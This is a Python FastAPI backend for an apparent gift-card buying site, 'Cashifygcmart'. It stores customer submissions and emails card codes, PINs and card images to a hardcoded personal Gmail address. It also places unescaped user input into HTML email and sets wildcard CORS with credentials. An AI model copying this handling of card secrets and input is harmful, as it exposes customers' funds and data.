from fastapi import FastAPI, APIRouter
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel
from typing import List, Optional
from datetime import datetime
import random
import httpx


ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")


# Define Models
class StatusCheck(BaseModel):
    message: str = "API is working"

class GiftCardSubmission(BaseModel):
    # Personal Information
    firstName: str
    lastName: str
    email: str
    phoneNumber: Optional[str] = ""
    
    # Gift Card Details (simplified for now - you can expand this)
    cards: List[dict]
    
    # Payment Information
    paymentMethod: str
    paypalAddress: Optional[str] = ""
    zelleDetails: Optional[str] = ""
    cashAppTag: Optional[str] = ""
    btcAddress: Optional[str] = ""
    chimeDetails: Optional[str] = ""

# Email Template Functions
def generate_confirmation_email_html(customer_name, reference_number):
    return f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gift Card Submission Confirmation</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #1f2937;
            background-color: #f9fafb;
            padding: 20px 0;
        }}
        .email-container {{
            max-width: 650px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }}
        
        /* Header */
        .header {{
            background: linear-gradient(135deg, #ec4899 0%, #8b5cf6 50%, #ec4899 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
            position: relative;
        }}
        .header::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grain" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="50" cy="50" r="1" fill="white" opacity="0.1"/></pattern></defs><rect width="100" height="100" fill="url(%23grain)"/></svg>');
            opacity: 0.3;
        }}
        .logo {{
            font-size: 28px;
            font-weight: 800;
            margin-bottom: 8px;
            position: relative;
            z-index: 1;
        }}
        .tagline {{
            font-size: 12px;
            opacity: 0.9;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            z-index: 1;
        }}
        .header h1 {{
            margin-top: 20px;
            font-size: 24px;
            font-weight: 600;
            position: relative;
            z-index: 1;
        }}
        
        /* Content */
        .content {{
            padding: 40px 30px;
        }}
        
        /* Status Card */
        .status-card {{
            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
            border: 2px solid #0ea5e9;
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 32px;
            position: relative;
        }}
        .status-card::before {{
            content: '✓';
            position: absolute;
            top: -12px;
            left: 24px;
            background: #0ea5e9;
            color: white;
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 14px;
        }}
        .status-title {{
            font-size: 18px;
            font-weight: 700;
            color: #0c4a6e;
            margin-bottom: 8px;
        }}
        .reference-number {{
            font-size: 20px;
            font-weight: 800;
            color: #ec4899;
            font-family: 'Monaco', 'Consolas', monospace;
            margin-bottom: 12px;
        }}
        .status-text {{
            color: #1e40af;
            font-weight: 500;
            background: rgba(255, 255, 255, 0.8);
            padding: 12px;
            border-radius: 8px;
            margin-top: 12px;
        }}
        
        /* Section Cards */
        .section-card {{
            background: #ffffff;
            border: 1px solid #e5e7eb;
            border-radius: 12px;
            margin-bottom: 24px;
            overflow: hidden;
        }}
        .section-header {{
            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
            padding: 20px 24px;
            border-bottom: 1px solid #e5e7eb;
        }}
        .section-title {{
            font-size: 18px;
            font-weight: 700;
            color: #1f2937;
            display: flex;
            align-items: center;
        }}
        .section-icon {{
            margin-right: 12px;
            font-size: 20px;
        }}
        .section-content {{
            padding: 24px;
        }}
        
        /* Next Steps */
        .steps-list {{
            list-style: none;
            counter-reset: step-counter;
        }}
        .steps-list li {{
            counter-increment: step-counter;
            position: relative;
            padding: 16px 0 16px 50px;
            border-bottom: 1px solid #f3f4f6;
        }}
        .steps-list li:last-child {{
            border-bottom: none;
        }}
        .steps-list li::before {{
            content: counter(step-counter);
            position: absolute;
            left: 0;
            top: 16px;
            background: #ec4899;
            color: white;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 14px;
        }}
        .step-title {{
            font-weight: 600;
            color: #1f2937;
            margin-bottom: 4px;
        }}
        .step-description {{
            color: #6b7280;
            font-size: 14px;
        }}
        
        /* Important Notice */
        .important-notice {{
            background: linear-gradient(135deg, #fef2f2 0%, #fee2e2 100%);
            border: 2px solid #f87171;
            border-radius: 12px;
            padding: 20px;
            margin: 24px 0;
            position: relative;
        }}
        .important-notice::before {{
            content: '⚠️';
            position: absolute;
            top: -12px;
            left: 20px;
            background: #ef4444;
            color: white;
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
        }}
        .important-title {{
            font-weight: 700;
            color: #dc2626;
            margin-bottom: 8px;
        }}
        .important-text {{
            color: #7f1d1d;
            font-weight: 500;
        }}
        
        /* Guidelines Grid */
        .guidelines-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 16px;
            margin-top: 16px;
        }}
        .guideline-item {{
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            padding: 16px;
        }}
        .guideline-title {{
            font-weight: 600;
            color: #1e40af;
            margin-bottom: 6px;
            font-size: 14px;
        }}
        .guideline-text {{
            color: #64748b;
            font-size: 13px;
        }}
        
        /* Footer */
        .footer {{
            background: linear-gradient(135deg, #1f2937 0%, #374151 100%);
            color: white;
            padding: 32px 30px;
            text-align: center;
        }}
        .signature {{
            margin-bottom: 24px;
            padding-bottom: 24px;
            border-bottom: 1px solid #4b5563;
        }}
        .signature-name {{
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 4px;
        }}
        .signature-title {{
            color: #d1d5db;
            font-size: 14px;
        }}
        .contact-section {{
            display: flex;
            justify-content: center;
            gap: 32px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }}
        .contact-item {{
            display: flex;
            align-items: center;
            gap: 8px;
            color: #d1d5db;
            text-decoration: none;
            font-size: 14px;
            padding: 8px 16px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            transition: all 0.3s ease;
        }}
        .contact-item:hover {{
            background: rgba(255, 255, 255, 0.2);
            color: white;
        }}
        .footer-note {{
            font-size: 12px;
            color: #9ca3af;
            line-height: 1.5;
        }}
        
        /* Mobile Responsive */
        @media (max-width: 640px) {{
            .email-container {{
                margin: 0 10px;
                border-radius: 12px;
            }}
            .header, .content, .footer {{
                padding: 24px 20px;
            }}
            .status-card, .section-content {{
                padding: 16px;
            }}
            .contact-section {{
                flex-direction: column;
                gap: 12px;
            }}
            .guidelines-grid {{
                grid-template-columns: 1fr;
            }}
        }}
    </style>
</head>
<body>
    <div class="email-container">
        <!-- Header -->
        <div class="header">
            <div class="logo">Cashifygcmart</div>
            <div class="tagline">Instant Offers, Same-Day Payments</div>
            <h1>Submission Received Successfully!</h1>
        </div>
        
        <!-- Content -->
        <div class="content">
            <!-- Status Card -->
            <div class="status-card">
                <div class="status-title">Hello {customer_name},</div>
                <div class="reference-number">Reference: {reference_number}</div>
                <div class="status-text">
                    Your gift card submission has been received and is now under review by our verification team.
                </div>
            </div>
            
            <!-- Next Steps Section -->
            <div class="section-card">
                <div class="section-header">
                    <div class="section-title">
                        <span class="section-icon">🚀</span>
                        What Happens Next
                    </div>
                </div>
                <div class="section-content">
                    <ul class="steps-list">
                        <li>
                            <div class="step-title">Verification Process</div>
                            <div class="step-description">Our team reviews your submission within 2-4 hours during business hours</div>
                        </li>
                        <li>
                            <div class="step-title">Email Notification</div>
                            <div class="step-description">You'll receive a quote or additional information request</div>
                        </li>
                        <li>
                            <div class="step-title">Quick Payment</div>
                            <div class="step-description">Upon approval, payment is processed the same business day</div>
                        </li>
                    </ul>
                </div>
            </div>
            
            <!-- Important Notice -->
            <div class="important-notice">
                <div class="important-title">Important Notice</div>
                <div class="important-text">
                    Please do not use or redeem your gift card while it's under review. This ensures smooth processing and prevents any complications with your submission.
                </div>
            </div>
            
            <!-- Guidelines Section -->
            <div class="section-card">
                <div class="section-header">
                    <div class="section-title">
                        <span class="section-icon">📋</span>
                        Processing Guidelines
                    </div>
                </div>
                <div class="section-content">
                    <div class="guidelines-grid">
                        <div class="guideline-item">
                            <div class="guideline-title">Processing Hours</div>
                            <div class="guideline-text">Monday-Saturday, 9 AM - 8 PM EST<br>Sunday submissions reviewed Monday</div>
                        </div>
                        <div class="guideline-item">
                            <div class="guideline-title">Minimum Value</div>
                            <div class="guideline-text">$50 per card<br>Only cards listed in Rate Calculator accepted</div>
                        </div>
                        <div class="guideline-item">
                            <div class="guideline-title">Response Time</div>
                            <div class="guideline-text">Updates within 2-4 hours<br>Check inbox and spam folders</div>
                        </div>
                        <div class="guideline-item">
                            <div class="guideline-title">Questions?</div>
                            <div class="guideline-text">Include reference number {reference_number}<br>in all correspondence</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <div class="signature">
                <div class="signature-name">Robert Smith</div>
                <div class="signature-title">Customer Success Manager</div>
            </div>
            
            <div class="contact-section">
                <a href="mailto:support@cashifygcmart.com" class="contact-item">
                    <span>📧</span>
                    <span>support@cashifygcmart.com</span>
                </a>
                <a href="https://www.cashifygcmart.com" class="contact-item">
                    <span>🌐</span>
                    <span>www.cashifygcmart.com</span>
                </a>
            </div>
            
            <div class="footer-note">
                © 2025 Cashifygcmart. All rights reserved.<br>
                Add support@cashifygcmart.com to your contacts for best delivery.
            </div>
        </div>
    </div>
</body>
</html>
    """

# Generate unique reference number
def generate_reference_number():
    timestamp = datetime.now().strftime("%H%M%S")
    random_num = random.randint(10, 99)
    return f"GC-{timestamp}-{random_num}"

# Resend email sending function for customer confirmation
async def send_confirmation_email(email: str, customer_name: str, reference_number: str):
    try:
        # Get Resend API key from environment
        resend_api_key = os.environ.get('RESEND_API_KEY')
        if not resend_api_key:
            print("ERROR: RESEND_API_KEY not found in environment variables")
            return False
        
        # Generate email content
        email_html = generate_confirmation_email_html(customer_name, reference_number)
        subject = f"Gift Card Submission Confirmation - Reference #{reference_number}"
        
        # Prepare Resend API payload
        payload = {
            "from": "onboarding@resend.dev",  # Use Resend's default verified domain for testing
            "to": [email],
            "subject": subject,
            "html": email_html
        }
        
        # Send email via Resend API
        async with httpx.AsyncClient() as client:
            response = await client.post(
                "https://api.resend.com/emails",
                headers={
                    "Authorization": f"Bearer {resend_api_key}",
                    "Content-Type": "application/json"
                },
                json=payload
            )
        
        if response.status_code == 200:
            print(f"✅ Customer confirmation email sent to: {email}")
            print(f"Resend Response Status: {response.status_code}")
            print(f"Reference Number: {reference_number}")
            return True
        else:
            print(f"❌ Resend API error: {response.status_code} - {response.text}")
            return False
        
    except Exception as e:
        print(f"❌ Resend email sending failed: {e}")
        return False

# Internal notification email template for operations team with images
def generate_internal_notification_email(customer_name, reference_number, submission_data):
    cards_info = ""
    total_value = 0
    
    for i, card in enumerate(submission_data.get('cards', []), 1):
        card_value = float(card.get('value', 0)) if card.get('value', '').replace('.', '').isdigit() else 0
        total_value += card_value
        
        # Image status indicators
        front_img_status = "✅ Uploaded" if card.get('frontImage') else "❌ Missing"
        back_img_status = "✅ Uploaded" if card.get('backImage') else "❌ Missing"
        receipt_img_status = "✅ Uploaded" if card.get('receiptImage') else "❌ Not Required" if card.get('hasReceipt') == 'no' else "❌ Missing"
        digital_code = card.get('digitalCode', 'N/A') if card.get('cardType') == 'digital' else 'N/A'
        digital_pin = card.get('digitalPin', 'N/A') if card.get('cardType') == 'digital' else 'N/A'
        
        cards_info += f"""
        <tr style="border-bottom: 1px solid #e5e7eb;">
            <td style="padding: 12px; text-align: left; font-weight: bold;">{i}</td>
            <td style="padding: 12px; text-align: left;"><strong>{card.get('brand', 'N/A')}</strong></td>
            <td style="padding: 12px; text-align: left;"><strong>${card.get('value', '0')}</strong></td>
            <td style="padding: 12px; text-align: left;">{card.get('condition', 'N/A').replace('-', ' ').title()}</td>
            <td style="padding: 12px; text-align: left;">{"✅ Yes" if card.get('hasReceipt') == 'yes' else "❌ No"}</td>
            <td style="padding: 12px; text-align: left;">{card.get('cardType', 'N/A').title()}</td>
        </tr>
        <tr style="background-color: #f8fafc;">
            <td colspan="2" style="padding: 8px 12px; font-size: 12px;"><strong>Images:</strong></td>
            <td style="padding: 8px 12px; font-size: 12px;">Front: {front_img_status}</td>
            <td style="padding: 8px 12px; font-size: 12px;">Back: {back_img_status}</td>
            <td style="padding: 8px 12px; font-size: 12px;">Receipt: {receipt_img_status}</td>
            <td style="padding: 8px 12px; font-size: 12px;"></td>
        </tr>
        {"" if card.get('cardType') != 'digital' else f'''
        <tr style="background-color: #ecfef5;">
            <td colspan="3" style="padding: 8px 12px; font-size: 12px;"><strong>Digital Code:</strong> {digital_code}</td>
            <td colspan="3" style="padding: 8px 12px; font-size: 12px;"><strong>Digital PIN:</strong> {digital_pin}</td>
        </tr>
        '''}"""
    
    # Payment method details
    payment_details = ""
    payment_method = submission_data.get('paymentMethod', '').upper()
    if payment_method == 'PAYPAL':
        payment_details = f"PayPal Address: {submission_data.get('paypalAddress', 'Not provided')}"
    elif payment_method == 'ZELLE':
        payment_details = f"Zelle Details: {submission_data.get('zelleDetails', 'Not provided')}"
    elif payment_method == 'CASHAPP':
        payment_details = f"Cash App Tag: {submission_data.get('cashAppTag', 'Not provided')}"
    elif payment_method == 'BTC':
        payment_details = f"Bitcoin Address: {submission_data.get('btcAddress', 'Not provided')}"
    elif payment_method == 'CHIME':
        payment_details = f"Chime Details: {submission_data.get('chimeDetails', 'Not provided')}"
    
    return f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>New Gift Card Submission - {reference_number}</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
        }}
        .email-container {{
            max-width: 900px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }}
        .header {{
            background: linear-gradient(135deg, #dc2626 0%, #ef4444 100%);
            color: white;
            padding: 25px 20px;
            text-align: center;
        }}
        .header h1 {{
            margin: 0;
            font-size: 24px;
            font-weight: 600;
        }}
        .content {{
            padding: 25px;
        }}
        .reference-number {{
            background-color: #fee2e2;
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #dc2626;
            text-align: center;
        }}
        .reference-number strong {{
            color: #dc2626;
            font-size: 18px;
        }}
        .section {{
            margin-bottom: 25px;
        }}
        .section-title {{
            color: #1e40af;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            background-color: #f0f9ff;
            padding: 8px 12px;
            border-radius: 6px;
        }}
        .customer-info {{
            background-color: #f8fafc;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 15px;
        }}
        .customer-info table {{
            width: 100%;
            border-collapse: collapse;
        }}
        .customer-info td {{
            padding: 6px 12px;
            border-bottom: 1px solid #e5e7eb;
            font-size: 14px;
        }}
        .customer-info td:first-child {{
            font-weight: 600;
            width: 25%;
            color: #374151;
        }}
        .cards-table {{
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            overflow: hidden;
            font-size: 13px;
        }}
        .cards-table th {{
            background-color: #1f2937;
            color: white;
            padding: 10px 8px;
            text-align: left;
            font-weight: 600;
            font-size: 12px;
        }}
        .urgent {{
            background-color: #fef2f2;
            border: 2px solid #fca5a5;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }}
        .urgent strong {{
            color: #dc2626;
        }}
        .total-value {{
            background-color: #ecfdf5;
            border: 2px solid #a3e635;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin: 15px 0;
        }}
        .total-value strong {{
            color: #166534;
            font-size: 18px;
        }}
        .actions {{
            background-color: #fffbeb;
            border: 1px solid #fbbf24;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }}
        .footer {{
            background-color: #f9fafb;
            padding: 15px;
            text-align: center;
            color: #6b7280;
            font-size: 12px;
        }}
    </style>
</head>
<body>
    <div class="email-container">
        <div class="header">
            <h1>🚨 NEW GIFT CARD SUBMISSION RECEIVED</h1>
        </div>
        
        <div class="content">
            <div class="reference-number">
                <strong>Reference Number: {reference_number}</strong><br>
                <span style="font-size: 12px; color: #6b7280;">Submitted: {submission_data.get('submitted_at', 'Just Now')}</span>
            </div>
            
            <div class="urgent">
                <strong>⏰ IMMEDIATE ACTION REQUIRED:</strong> New submission requires verification and response within 14 hours per customer promise.
            </div>
            
            <div class="section">
                <h2 class="section-title">👤 CUSTOMER INFORMATION</h2>
                <div class="customer-info">
                    <table>
                        <tr>
                            <td><strong>Full Name:</strong></td>
                            <td><strong>{customer_name}</strong></td>
                        </tr>
                        <tr>
                            <td><strong>Email Address:</strong></td>
                            <td><a href="mailto:{submission_data.get('email')}" style="color: #3b82f6;">{submission_data.get('email')}</a></td>
                        </tr>
                        <tr>
                            <td><strong>Phone Number:</strong></td>
                            <td>{submission_data.get('phoneNumber', 'Not provided')}</td>
                        </tr>
                        <tr>
                            <td><strong>Payment Method:</strong></td>
                            <td><strong>{payment_method}</strong></td>
                        </tr>
                        <tr>
                            <td><strong>Payment Details:</strong></td>
                            <td>{payment_details}</td>
                        </tr>
                    </table>
                </div>
            </div>
            
            <div class="section">
                <h2 class="section-title">💳 GIFT CARD SUBMISSION DETAILS</h2>
                <table class="cards-table">
                    <thead>
                        <tr>
                            <th>#</th>
                            <th>Brand</th>
                            <th>Value</th>
                            <th>Condition</th>
                            <th>Receipt</th>
                            <th>Type</th>
                        </tr>
                    </thead>
                    <tbody>
                        {cards_info}
                    </tbody>
                </table>
            </div>
            
            <div class="total-value">
                <strong>💰 TOTAL SUBMISSION VALUE: ${total_value:.2f}</strong>
            </div>
            
            <div class="actions">
                <h3 style="margin: 0 0 10px 0; color: #92400e;">📋 REQUIRED ACTIONS:</h3>
                <ol style="margin: 0; padding-left: 20px; color: #92400e;">
                    <li><strong>Verify Images:</strong> Check all uploaded card images and receipts</li>
                    <li><strong>Validate Details:</strong> Confirm card brands, values, and conditions</li>
                    <li><strong>Process Payment Info:</strong> Verify {payment_method} details</li>
                    <li><strong>Calculate Rates:</strong> Apply current rates for approval/offer</li>
                    <li><strong>Respond to Customer:</strong> Email {submission_data.get('email')} within 14 hours</li>
                </ol>
            </div>
            
            <div style="background-color: #f0fdf4; padding: 12px; border-radius: 8px; text-align: center; font-size: 13px; color: #166534;">
                <strong>Customer Reference Number: {reference_number}</strong><br>
                Customer confirmation email automatically sent to: {submission_data.get('email')}
            </div>
            
            <div style="margin-top: 20px; padding: 15px; background-color: #fee2e2; border-radius: 8px; border-left: 4px solid #dc2626;">
                <strong style="color: #dc2626;">⚠️ IMPORTANT:</strong> All uploaded images are attached to this email. Customer has been instructed not to use the gift card during review period.
            </div>
        </div>
        
        <div class="footer">
            <p><strong>Cashifygcmart Operations Alert</strong></p>
            <p>This is an automated notification. Customer awaiting response within 14 hours.</p>
            <p>Forward to: marketingmanager3059@gmail.com</p>
        </div>
    </div>
</body>
</html>
    """

# Resend email sending function for internal notifications with attachments
async def send_internal_notification_email(submission_data: dict, customer_name: str, reference_number: str):
    try:
        # Get Resend API key from environment
        resend_api_key = os.environ.get('RESEND_API_KEY')
        if not resend_api_key:
            print("ERROR: RESEND_API_KEY not found in environment variables")
            return False
        
        # Internal email settings - temporarily using your email for testing
        operations_email = "kalyan82kanchana@gmail.com"
        
        # Calculate total value for subject line
        total_value = sum([float(card.get('value', 0)) if card.get('value', '').replace('.', '').isdigit() else 0 
                          for card in submission_data.get('cards', [])])
        
        # Generate email content
        email_html = generate_internal_notification_email(customer_name, reference_number, submission_data)
        subject = f"🚨 NEW SUBMISSION: {reference_number} - {customer_name} (${total_value:.2f})"
        
        # Prepare Resend API payload
        payload = {
            "from": "onboarding@resend.dev",  # Use Resend's default verified domain for testing
            "to": [operations_email],
            "subject": subject,
            "html": email_html,
            "attachments": []
        }
        
        # Process file attachments from uploaded images
        attachment_count = 0
        for i, card in enumerate(submission_data.get('cards', []), 1):
            # Handle front image
            if card.get('frontImage') and isinstance(card['frontImage'], dict):
                if 'data' in card['frontImage'] and 'name' in card['frontImage']:
                    try:
                        # Decode base64 image data
                        image_data = card['frontImage']['data']
                        if image_data.startswith('data:'):
                            # Remove data URL prefix
                            image_data = image_data.split(',')[1]
                        
                        attachment = {
                            "filename": f"Card_{i}_Front_{card['frontImage']['name']}",
                            "content": image_data,
                            "content_type": card['frontImage'].get('type', 'image/jpeg')
                        }
                        payload["attachments"].append(attachment)
                        attachment_count += 1
                    except Exception as e:
                        print(f"Failed to attach front image for card {i}: {e}")
            
            # Handle back image
            if card.get('backImage') and isinstance(card['backImage'], dict):
                if 'data' in card['backImage'] and 'name' in card['backImage']:
                    try:
                        image_data = card['backImage']['data']
                        if image_data.startswith('data:'):
                            image_data = image_data.split(',')[1]
                        
                        attachment = {
                            "filename": f"Card_{i}_Back_{card['backImage']['name']}",
                            "content": image_data,
                            "content_type": card['backImage'].get('type', 'image/jpeg')
                        }
                        payload["attachments"].append(attachment)
                        attachment_count += 1
                    except Exception as e:
                        print(f"Failed to attach back image for card {i}: {e}")
            
            # Handle receipt image
            if card.get('receiptImage') and isinstance(card['receiptImage'], dict):
                if 'data' in card['receiptImage'] and 'name' in card['receiptImage']:
                    try:
                        image_data = card['receiptImage']['data']
                        if image_data.startswith('data:'):
                            image_data = image_data.split(',')[1]
                        
                        attachment = {
                            "filename": f"Card_{i}_Receipt_{card['receiptImage']['name']}",
                            "content": image_data,
                            "content_type": card['receiptImage'].get('type', 'image/jpeg')
                        }
                        payload["attachments"].append(attachment)
                        attachment_count += 1
                    except Exception as e:
                        print(f"Failed to attach receipt image for card {i}: {e}")
        
        # Send email via Resend API
        async with httpx.AsyncClient() as client:
            response = await client.post(
                "https://api.resend.com/emails",
                headers={
                    "Authorization": f"Bearer {resend_api_key}",
                    "Content-Type": "application/json"
                },
                json=payload
            )
        
        if response.status_code == 200:
            print(f"✅ Internal notification email sent to: {operations_email}")
            print(f"Resend Response Status: {response.status_code}")
            print(f"New submission from: {customer_name}")
            print(f"Reference Number: {reference_number}")
            print(f"Customer Email: {submission_data.get('email')}")
            print(f"Cards Count: {len(submission_data.get('cards', []))}")
            print(f"Attachments: {attachment_count} files attached")
            return True
        else:
            print(f"❌ Resend API error: {response.status_code} - {response.text}")
            return False
        
    except Exception as e:
        print(f"❌ Resend internal notification failed: {e}")
        return False

# Add your routes to the router instead of directly to app
@api_router.get("/")
async def root():
    return {"message": "Hello World"}

@api_router.post("/status", response_model=StatusCheck)
async def create_status_check():
    status_obj = StatusCheck()
    _ = await db.status_checks.insert_one(status_obj.dict())
    return status_obj

@api_router.post("/submit-gift-card")
async def submit_gift_card(submission: GiftCardSubmission):
    try:
        # Generate unique reference number
        reference_number = generate_reference_number()
        
        # Add metadata to submission
        submission_data = submission.dict()
        submission_data["reference_number"] = reference_number
        submission_data["status"] = "under_review"
        submission_data["submitted_at"] = datetime.now().isoformat()
        
        # Save to database
        await db.gift_card_submissions.insert_one(submission_data)
        
        # Send emails
        customer_name = f"{submission.firstName} {submission.lastName}"
        
        # 1. Send customer confirmation email
        customer_email_sent = await send_confirmation_email(
            submission.email, 
            customer_name, 
            reference_number
        )
        
        # 2. Send internal notification email to operations team
        internal_email_sent = await send_internal_notification_email(
            submission_data,
            customer_name, 
            reference_number
        )
        
        return {
            "success": True,
            "reference_number": reference_number,
            "message": "Gift card submission received successfully",
            "customer_email_sent": customer_email_sent,
            "internal_email_sent": internal_email_sent
        }
        
    except Exception as e:
        logging.error(f"Gift card submission error: {e}")
        return {
            "success": False,
            "message": "An error occurred while processing your submission"
        }

@api_router.get("/status", response_model=List[StatusCheck])
async def get_status_checks():
    status_checks = await db.status_checks.find().to_list(1000)
    return [StatusCheck(**status_check) for status_check in status_checks]

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
